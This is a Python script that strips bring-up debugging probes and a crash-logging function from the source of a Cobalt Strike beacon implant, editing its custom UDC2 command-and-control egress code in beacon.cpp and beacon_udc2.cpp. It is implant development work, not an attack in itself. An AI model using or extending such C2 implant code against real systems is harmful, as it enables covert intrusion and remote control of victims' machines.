#!/usr/bin/env python3
"""Strip the UDC2 bring-up probes from the beacon (final state)."""
import io

# 1) beacon.cpp: remove probe calls + externs
p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()

old = """extern void udc2_queue(char * data, int length);
extern BOOL udc2_booted(void);
extern void udc2_step_mark(int stage);"""
assert s.count(old) == 1
s = s.replace(old, "extern void udc2_queue(char * data, int length);")

old2 = """			post_type = POST_UDC2;
			post_error_d(0x62, beacon_cycles); /* probe: engage round (rides UDC2 egress) */
"""
assert s.count(old2) == 1
s = s.replace(old2, "\t\t\tpost_type = POST_UDC2;\n")

old3 = """			length = udc2_cycle(buffer, MAX_GET);
			udc2_step_mark(62400 + (length < 0 ? 99 : (length & 0x7F)));
"""
assert s.count(old3) == 1
s = s.replace(old3, "\t\t\tlength = udc2_cycle(buffer, MAX_GET);\n")

io.open(p, "w", encoding="utf-8", newline="").write(s)
print("beacon.cpp probes stripped")

# 2) beacon_udc2.cpp: remove step-mark calls + the writer + accessor
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon_udc2.cpp"
s2 = io.open(p2, encoding="utf-8").read()

old4 = """	udc2_step_mark(62200 + (length & 0xFF));
	rv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);
	udc2_step_mark(62300 + (rv & 0x7F));
"""
assert s2.count(old4) == 1
s2 = s2.replace(old4, "\trv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);\n")

old5 = """int udc2_cycle(char * recv, int max) {
	int rv;

	udc2_step_mark(62100 + (udc2.sent_meta ? 1 : 0));"""
assert s2.count(old5) == 1
s2 = s2.replace(old5, "int udc2_cycle(char * recv, int max) {\n\tint rv;")

# remove the writer function block (from the comment to the closing brace)
start = s2.find("/* crash-localisation probe: append one decimal line")
assert start > 0
end_marker = "	CloseHandle(h);\n}"
end = s2.find(end_marker, start)
assert end > 0
end += len(end_marker)
# also swallow the trailing newline
s2 = s2[:start] + s2[end:].lstrip("\r\n")
# remove the now-unused chr_bs define
s2 = s2.replace("#define chr_bs 92 /* backslash - file path separator in stack-built strings */\n\n", "")
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("beacon_udc2.cpp probes stripped")
